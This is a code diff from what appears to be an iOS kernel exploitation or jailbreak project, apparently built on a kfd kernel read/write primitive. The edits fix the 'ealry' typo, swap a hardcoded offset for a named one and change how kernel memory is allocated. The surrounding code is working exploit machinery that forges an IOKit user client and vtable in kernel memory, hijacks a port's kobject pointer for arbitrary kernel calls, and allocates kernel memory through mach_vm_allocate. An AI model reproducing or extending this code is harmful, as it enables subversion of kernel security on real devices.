@@ -58,7 +58,7 @@ bool setup_client(void) {
     
     kwrite64_kfd(fake_client, fake_vtable);
     usleep(1000);
-    kwrite64_kfd(userclient_port + 0x48, fake_client);
+    kwrite64_kfd(userclient_port + off_ipc_port_ip_kobject, fake_client);
     usleep(1000);
     kwrite64_kfd(fake_vtable + 8 * 0xB8, add_x0_x0_0x40);
     usleep(1000);
@@ -68,7 +68,7 @@ bool setup_client(void) {
     return true;
 }
 
-uint64_t ealry_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+uint64_t early_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
     uint64_t offx20 = kread64_kfd(fake_client + 0x40);
     uint64_t offx28 = kread64_kfd(fake_client + 0x48);
     kwrite64_kfd(fake_client + 0x40, x0);
@@ -80,6 +80,7 @@ uint64_t ealry_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint6
     return kcall_ret;
 }
 
+/*--- kalloc ---*/
 uint64_t dirty_kalloc(size_t size) {
     uint64_t begin = get_kernel_proc();
     uint64_t end = begin + 0x40000000;
@@ -112,7 +113,7 @@ uint64_t mach_kalloc_init(void) {
     
     uint64_t unstable_scratchbuf = dirty_kalloc(100);
     
-    kern_return_t ret = (kern_return_t)ealry_kcall(mach_vm_alloc + get_kernel_slide(),
+    kern_return_t ret = (kern_return_t)early_kcall(mach_vm_alloc + get_kernel_slide(),
           kernel_map,
           unstable_scratchbuf,
           0x4000,
@@ -138,7 +139,7 @@ uint64_t mach_kalloc(size_t size) {
     
     uint64_t kernel_map = get_kernel_map();
         
-    kern_return_t ret = (kern_return_t)ealry_kcall(mach_vm_alloc + get_kernel_slide(),
+    kern_return_t ret = (kern_return_t)early_kcall(mach_vm_alloc + get_kernel_slide(),
           kernel_map,
           kalloc_scratchbuf,
           size,
@@ -161,12 +162,10 @@ uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
     return 0;
 }
 
-bool init_kcall(bool ealry) {
-    if(!ealry) {
-        uint64_t allocated_mem = mach_kalloc(0x2000);
-        
-        fake_vtable = allocated_mem;
-        fake_client = allocated_mem + 0x1000;
+bool init_kcall(bool early) {
+    if(!early) {
+        fake_vtable = mach_kalloc(0x4000);
+        fake_client = mach_kalloc(0x4000);
         
         IOServiceClose(user_client);
         
